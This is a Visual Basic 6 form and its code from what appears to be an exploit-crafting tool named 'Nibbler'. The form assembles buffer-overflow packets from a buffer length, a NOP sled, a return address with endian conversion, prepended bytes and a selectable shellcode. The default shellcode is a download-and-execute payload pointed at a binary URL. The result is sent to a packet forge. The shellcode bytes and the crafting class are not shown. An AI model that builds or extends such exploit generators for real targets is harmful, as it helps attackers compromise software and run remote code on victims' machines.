VERSION 5.00
Begin VB.Form frmSploitzzz 
   Caption         =   "Craft Exploit"
   ClientHeight    =   5835
   ClientLeft      =   120
   ClientTop       =   450
   ClientWidth     =   4110
   Icon            =   "frmSploitzzz.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   5835
   ScaleWidth      =   4110
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox txtPrepend 
      Height          =   285
      Left            =   1560
      TabIndex        =   16
      Text            =   "0F2E445723"
      Top             =   2640
      Width           =   2415
   End
   Begin VB.CheckBox chkPrepend 
      Caption         =   "Prepend Bytes"
      Height          =   255
      Left            =   120
      TabIndex        =   15
      Top             =   2640
      Width           =   1455
   End
   Begin VB.TextBox txtNops 
      Height          =   285
      Left            =   2520
      TabIndex        =   14
      Text            =   "25"
      Top             =   2280
      Width           =   1455
   End
   Begin VB.CheckBox chkNops 
      Caption         =   "Nop Sled (Wheee!)"
      Height          =   255
      Left            =   120
      TabIndex        =   13
      Top             =   2280
      Width           =   2055
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Add"
      Height          =   255
      Left            =   2880
      TabIndex        =   12
      Top             =   720
      Width           =   975
   End
   Begin VB.TextBox Text4 
      Height          =   285
      Left            =   120
      TabIndex        =   10
      Text            =   "http://google.com/binary.exe"
      Top             =   1320
      Width           =   3735
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Send To Packet Forge"
      Height          =   375
      Left            =   120
      TabIndex        =   9
      Top             =   5400
      Width           =   3855
   End
   Begin VB.TextBox txtPacket 
      Height          =   2055
      Left            =   120
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   8
      Top             =   3360
      Width           =   3855
   End
   Begin VB.CheckBox chkEndian 
      Caption         =   "Little Endian"
      Height          =   255
      Left            =   2640
      TabIndex        =   7
      ToolTipText     =   $"frmSploitzzz.frx":15371
      Top             =   1800
      Width           =   1215
   End
   Begin VB.TextBox txtRet 
      Height          =   285
      Left            =   1440
      TabIndex        =   6
      Text            =   "41424142"
      Top             =   1800
      Width           =   975
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Generate"
      Height          =   375
      Left            =   120
      TabIndex        =   4
      Top             =   3000
      Width           =   3855
   End
   Begin VB.ComboBox cmbShellcode 
      Height          =   315
      Left            =   120
      TabIndex        =   3
      Text            =   "Shellcodes/dlExec"
      Top             =   720
      Width           =   2655
   End
   Begin VB.TextBox txtBuf 
      Height          =   285
      Left            =   1680
      TabIndex        =   2
      Text            =   "1024"
      Top             =   240
      Width           =   1215
   End
   Begin VB.Label Label4 
      Caption         =   "Params"
      Height          =   255
      Left            =   120
      TabIndex        =   11
      Top             =   1080
      Width           =   735
   End
   Begin VB.Label Label3 
      Caption         =   "Return Adress"
      Height          =   255
      Left            =   120
      TabIndex        =   5
      Top             =   1800
      Width           =   1215
   End
   Begin VB.Label Label2 
      Caption         =   "byte buffer"
      Height          =   255
      Left            =   3000
      TabIndex        =   1
      Top             =   240
      Width           =   855
   End
   Begin VB.Label Label1 
      Caption         =   "Generate exploit for"
      Height          =   255
      Left            =   120
      TabIndex        =   0
      Top             =   240
      Width           =   1815
   End
End
Attribute VB_Name = "frmSploitzzz"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'declare our exploit object
Private formSploit As New clsSploit

Private Sub Command1_Click()
    formSploit.bufferLen = Val(txtBuf.Text)
    formSploit.shellcode = returnShellcode(cmbShellcode.Text)
    formSploit.expName = "Nibbler Sample Exploit"
    formSploit.CVEID = "1337"
    
    formSploit.prepend = chkPrepend.Value
    
    If chkPrepend.Value = True Then
        formSploit.prependBytes = txtPrepend.Text
    End If
    
    If chkNops.Value = True Then
        formSploit.useNops = True
        formSploit.nopCount = Val(txtNops.Text)
    Else
        formSploit.useNops = False
    End If
    
    If chkEndian.Value = False Then
        formSploit.retOffset = txtRet.Text
        MsgBox formSploit.retOffset
        MsgBox HexToStr(formSploit.retOffset)
    Else
        formSploit.retOffset = Right(txtRet.Text, 2)
        formSploit.retOffset = formSploit.retOffset & Left(Right(txtRet.Text, 4), 2)
        formSploit.retOffset = formSploit.retOffset & Left(Right(txtRet.Text, 6), 2)
        formSploit.retOffset = formSploit.retOffset & Left(Right(txtRet.Text, 8), 2)
        MsgBox formSploit.retOffset
    End If
    
    
    formSploit.craftSploitCode
    
    txtPacket.Text = StringToHex(formSploit.evilPacket)
    
    
End Sub

Private Sub Command2_Click()
    frmMain.hexbox.Text = txtPacket.Text
    frmMain.asciibox.Text = HexToString(txtPacket.Text)
End Sub

Private Sub Form_Load()
    'Now we configure exploit creation menu

End Sub

Private Sub Label5_Click()

End Sub
